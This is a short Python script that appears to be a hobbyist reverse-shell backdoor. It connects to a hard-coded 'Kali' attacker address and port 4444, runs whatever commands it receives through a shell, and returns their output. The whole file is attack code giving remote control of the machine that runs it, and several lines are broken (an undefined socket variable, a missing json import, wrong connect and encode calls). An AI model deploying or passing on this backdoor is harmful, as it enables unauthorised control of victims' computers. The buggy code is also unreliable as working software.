import socket
import time
import subprocess

kali_ip = "192.168.0.8"
kali_port = 4444

def connection():
    while True:
        # sleeps 20 seconds
        time.sleep(20)
        try:
            # connect to destination addr
            s.connect(kali_ip, kali_port)
            #executing the commands
            shell()
            s.close()
        except: 
            connection()

def shell():
    while True: 
        # will receive the command that our server send
        command = reliable_receiv()
        if command == 'quit': 
            break
        else: 
            execute = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

def reliable_send(data):
    # data is our command and parses it to json
    jsonData = json.dumps(data)
    # send actual data, once sending data over sockets we need to encode it
    sock.send(json.encode())

def reliable_receiv():
    data = ''
    while True:
        try:
            # byte we want to receive (1024) from our target
            data = data + sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

# to make a connection with IP (AF_INET) over TCP (SOCK_STREAM)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#trying to connect to target
connection()